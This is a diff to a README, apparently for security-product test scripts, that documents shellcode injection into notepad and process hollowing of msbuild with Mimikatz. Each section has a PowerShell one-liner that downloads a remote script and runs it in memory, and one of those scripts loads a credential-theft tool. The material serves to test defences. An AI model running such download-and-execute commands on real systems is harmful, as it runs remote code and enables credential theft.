@@ -68,6 +68,7 @@ Shellcode injection and execution is one of the most popular living-off-the-land
 #### 1. Entry Injection
 Injection of shellcode into the entry of a legitimate spawn process
 In this example we will inject shellcode into notepad that spawns calculator
+
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ShellcodeInjection1.ps1"); Invoke-Shellcode1;`
 
 #### 2. Hollowing
@@ -75,4 +76,5 @@ Adversaries may inject malicious code into suspended and hollowed processes in o
 Process hollowing is a "living-off-the-land" method of executing arbitrary code in the address space of a separate live process. 
 https://attack.mitre.org/techniques/T1055/012/
 In this example we will hollow legitimate windows msbuild 64 bit process with Mimikatz
-`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Hollowing64.ps1"); Invoke-Hollow64;
+
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Hollowing64.ps1"); Invoke-Hollow64;`
